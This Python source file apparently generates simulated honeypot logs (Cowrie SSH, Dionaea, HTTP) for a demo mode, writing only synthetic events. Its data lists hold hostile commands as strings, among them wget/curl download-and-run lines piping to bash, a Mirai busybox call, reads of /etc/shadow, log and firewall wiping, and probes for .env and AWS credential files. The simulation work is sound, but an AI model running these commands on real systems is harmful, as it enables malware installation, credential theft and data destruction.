"""Generates realistic honeypot events for simulation/demo mode."""

import json
import random
import threading
import uuid
from datetime import datetime, timedelta, timezone

from config import LOG_DIR

_ATTACKER_IPS = [
    "185.220.101.47", "194.165.16.11", "45.142.212.100", "91.92.251.103",
    "198.235.24.156", "193.32.162.111", "5.188.206.14", "103.116.52.50",
    "23.129.64.131", "179.43.147.194", "185.156.73.54", "80.82.77.33",
    "218.92.0.186", "221.131.165.56", "1.180.195.43", "112.85.42.150",
]
_USERNAMES = [
    "root", "admin", "ubuntu", "pi", "oracle", "postgres",
    "user", "deploy", "jenkins", "git", "nagios", "test", "ftpuser",
]
_PASSWORDS = [
    "123456", "password", "admin", "root", "qwerty",
    "letmein", "admin123", "pass", "1234", "12345", "test", "",
]
_SSH_CLIENTS = [
    "SSH-2.0-libssh2_1.8.0", "SSH-2.0-OpenSSH_7.4", "SSH-2.0-Go",
    "SSH-2.0-PUTTY", "SSH-2.0-paramiko_2.9.2",
]
_COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "id",
    "whoami",
    "ps aux",
    "ls -la /tmp",
    "ifconfig",
    "ip route",
    "free -m",
    "wget http://194.165.16.11/bins/arm7 -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
    "curl -fsSL http://45.142.212.100/init.sh | bash",
    "cd /tmp; wget http://185.220.101.47/bot; chmod 777 bot; ./bot",
    "/bin/busybox MIRAI",
    "rm -rf /tmp/*",
    "crontab -r",
    "cat /etc/shadow",
    "history -c",
    "iptables -F",
    "crontab -l",
]
_DOWNLOAD_URLS = [
    "http://194.165.16.11/bins/arm7",
    "http://45.142.212.100/init.sh",
    "http://185.220.101.47/bot",
    "http://91.92.251.103/payload.bin",
]
_DOWNLOAD_HASHES = [
    (
        "d41d8cd98f00b204e9800998ecf8427e",
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    ),
    (
        "098f6bcd4621d373cade4e832627b4f6",
        "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a8d",
    ),
]
_HTTP_PATHS = [
    "/",
    "/wp-admin/",
    "/phpmyadmin/",
    "/.env",
    "/admin",
    "/../../../etc/passwd",
    "/wp-login.php",
    "/shell.php",
    "/.git/config",
    "/api/v1/users",
    "/actuator/env",
    "/.aws/credentials",
]
_HTTP_BODIES = ["", "username=admin&password=admin", "xss_test", "sql_inject"]
_HTTP_UA = [
    "Mozilla/5.0",
    "masscan/1.0",
    "zgrab/0.x",
    "python-requests/2.28.0",
    "Nikto/2.1.6",
    "sqlmap/1.7",
]


def _ts_ago(hours):
    return (datetime.now(timezone.utc) - timedelta(hours=hours)).isoformat()


def generate_cowrie_events(name, count=60, hours_back=24.0):
    events = []
    attackers = random.sample(_ATTACKER_IPS, min(8, len(_ATTACKER_IPS)))
    for _ in range(count):
        ip = random.choice(attackers)
        session = uuid.uuid4().hex[:16]
        ts = _ts_ago(random.uniform(0, hours_back))
        events.append({
            "eventid": "cowrie.session.connect",
            "timestamp": ts,
            "src_ip": ip,
            "src_port": random.randint(30000, 65000),
            "dst_port": 22,
            "session": session,
            "protocol": "ssh",
            "sensor": name,
        })
        for _ in range(random.randint(1, 8)):
            user = random.choice(_USERNAMES)
            pw = random.choice(_PASSWORDS)
            success = random.random() < 0.05
            events.append({
                "eventid": "cowrie.login.success" if success else "cowrie.login.failed",
                "timestamp": ts,
                "src_ip": ip,
                "session": session,
                "username": user,
                "password": pw,
                "sensor": name,
            })
            if success:
                events.append({
                    "eventid": "cowrie.client.version",
                    "timestamp": ts,
                    "src_ip": ip,
                    "session": session,
                    "version": random.choice(_SSH_CLIENTS),
                    "sensor": name,
                })
                for cmd in random.sample(_COMMANDS, random.randint(2, 6)):
                    events.append({
                        "eventid": "cowrie.command.input",
                        "timestamp": ts,
                        "src_ip": ip,
                        "session": session,
                        "input": cmd,
                        "sensor": name,
                    })
                if random.random() < 0.4:
                    md5, sha256 = random.choice(_DOWNLOAD_HASHES)
                    events.append({
                        "eventid": "cowrie.session.file_download",
                        "timestamp": ts,
                        "src_ip": ip,
                        "session": session,
                        "url": random.choice(_DOWNLOAD_URLS),
                        "outfile": "/tmp/." + uuid.uuid4().hex[:8],
                        "shasum": sha256,
                        "md5sum": md5,
                        "sensor": name,
                    })
    return sorted(events, key=lambda e: e["timestamp"])


def generate_dionaea_events(name, count=40, hours_back=24.0):
    events = []
    protocols = ["smb", "ftp", "http", "mssql", "mysql"]
    for _ in range(count):
        ip = random.choice(_ATTACKER_IPS)
        ts = _ts_ago(random.uniform(0, hours_back))
        proto = random.choice(protocols)
        event = {
            "eventid": "dionaea.connection." + proto,
            "timestamp": ts,
            "src_ip": ip,
            "src_port": random.randint(30000, 65000),
            "protocol": proto,
            "sensor": name,
        }
        if proto == "ftp":
            event["username"] = random.choice(_USERNAMES)
            event["password"] = random.choice(_PASSWORDS)
        elif proto in ("mssql", "mysql"):
            event["username"] = random.choice(["sa", "root", "admin", "dba"])
            event["password"] = random.choice(_PASSWORDS)
        elif proto == "smb" and random.random() < 0.3:
            md5, _ = random.choice(_DOWNLOAD_HASHES)
            event["eventid"] = "dionaea.download.complete"
            event["url"] = random.choice(_DOWNLOAD_URLS)
            event["md5hash"] = md5
        events.append(event)
    return sorted(events, key=lambda e: e["timestamp"])


def generate_http_events(name, count=50, hours_back=24.0):
    events = []
    for _ in range(count):
        ip = random.choice(_ATTACKER_IPS)
        ts = _ts_ago(random.uniform(0, hours_back))
        path = random.choice(_HTTP_PATHS)
        method = random.choice(["GET", "POST", "GET", "GET", "HEAD"])
        events.append({
            "timestamp": ts,
            "src_ip": ip,
            "method": method,
            "path": path,
            "query_string": "",
            "user_agent": random.choice(_HTTP_UA),
            "body": random.choice(_HTTP_BODIES) if method == "POST" else "",
            "response_code": random.choice([200, 401, 403, 404]),
            "sensor": name,
        })
    return sorted(events, key=lambda e: e["timestamp"])


def write_simulation_logs(honeypot_type, name, count=60):
    log_dir = LOG_DIR / honeypot_type / name
    log_dir.mkdir(parents=True, exist_ok=True)
    generators = {
        "cowrie": (generate_cowrie_events, "cowrie.json"),
        "dionaea": (generate_dionaea_events, "dionaea.json"),
        "http": (generate_http_events, "http_honeypot.json"),
    }
    if honeypot_type not in generators:
        return
    gen_fn, log_filename = generators[honeypot_type]
    events = gen_fn(name, count)
    nl = chr(10)
    with open(str(log_dir / log_filename), "w", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event) + nl)


class BackgroundEventWriter(threading.Thread):
    def __init__(self, honeypot_type, name, interval_seconds=30):
        super().__init__(daemon=True)
        self._type = honeypot_type
        self._name = name
        self._interval = interval_seconds
        self._stop_event = threading.Event()

    def run(self):
        write_simulation_logs(self._type, self._name, count=60)
        while not self._stop_event.wait(self._interval):
            self._append_new_events()

    def _append_new_events(self):
        log_dir = LOG_DIR / self._type / self._name
        generators = {
            "cowrie": (generate_cowrie_events, "cowrie.json"),
            "dionaea": (generate_dionaea_events, "dionaea.json"),
            "http": (generate_http_events, "http_honeypot.json"),
        }
        if self._type not in generators:
            return
        gen_fn, log_filename = generators[self._type]
        new_events = gen_fn(self._name, count=random.randint(2, 8), hours_back=0.1)
        nl = chr(10)
        with open(str(log_dir / log_filename), "a", encoding="utf-8") as f:
            for event in new_events:
                f.write(json.dumps(event) + nl)

    def stop(self):
        self._stop_event.set()
